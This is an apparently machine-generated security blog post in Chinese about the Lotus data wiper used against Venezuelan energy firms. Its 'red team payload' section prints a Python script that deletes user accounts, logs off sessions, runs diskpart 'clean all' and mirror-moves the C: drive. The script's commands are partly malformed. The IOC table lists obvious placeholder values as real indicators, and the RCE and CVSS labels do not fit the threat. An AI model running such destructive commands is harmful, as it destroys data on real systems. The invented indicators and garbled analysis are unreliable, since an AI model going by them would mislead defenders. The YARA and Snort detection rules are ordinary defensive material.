---
layout: post
title:  "New Lotus data wiper used against Venezuelan energy, utility firms"
date:   2026-04-21 19:03:58 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Lotus 資料毀滅惡意軟體：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `IOCTL` 呼叫、磁碟幾何、USN 日誌清除

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Lotus 惡意軟體利用 Windows 的 `IOCTL` 呼叫機制，直接與磁碟進行交互，從而實現資料毀滅。
* **攻擊流程圖解**:
  1. 執行 `OhSyncNow.bat` 腳本，停用 Windows 的 `UI0Detect` 服務。
  2. 執行 `notesreg.bat` 腳本，列舉使用者、停用帳戶、登出活躍會話、停用網路介面、停用快取登入。
  3. 使用 `diskpart clean all` 命令清除磁碟內容。
  4. 使用 `robocopy` 命令覆蓋目錄內容。
  5. 執行 Lotus 惡意軟體，實現資料毀滅。
* **受影響元件**: Windows 作業系統（所有版本）

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 管理員權限、網路存取
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 停用 UI0Detect 服務
    subprocess.call(['net', 'stop', 'UI0Detect'])
    
    # 列舉使用者、停用帳戶、登出活躍會話、停用網路介面、停用快取登入
    subprocess.call(['net', 'user', '/delete'])
    subprocess.call(['shutdown', '/l'])
    
    # 清除磁碟內容
    subprocess.call(['diskpart', '/s', 'clean all'])
    
    # 覆蓋目錄內容
    subprocess.call(['robocopy', '/mir', '/mov', 'C:\\\\', 'D:\\\\'])
    
    ```
* **繞過技術**: 可以使用 `IOCTL` 呼叫機制繞過 Windows 的安全機制

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\\Windows\\System32\\drivers\\etc\\hosts |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Lotus_Malware {
      meta:
        description = "Lotus 惡意軟體偵測規則"
        author = "Your Name"
      strings:
        $a = "OhSyncNow.bat"
        $b = "notesreg.bat"
      condition:
        $a or $b
    }
    
    ```
 

```

snort
alert tcp any any -> any 80 (msg:"Lotus 惡意軟體偵測"; content:"OhSyncNow.bat"; sid:1000001; rev:1;)

```
* **緩解措施**: 更新 Windows 修補程式、停用不必要的服務、限制使用者權限

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **IOCTL (Input/Output Control)**: 一種 Windows API，允許應用程式直接與硬體進行交互。
* **USN (Update Sequence Number) 日誌**: 一種 Windows 日誌，記錄檔案系統的變更。
* **磁碟幾何**: 磁碟的物理結構，包括磁碟大小、磁區大小等。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-lotus-data-wiper-used-against-venezuelan-energy-utility-firms/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1486/)


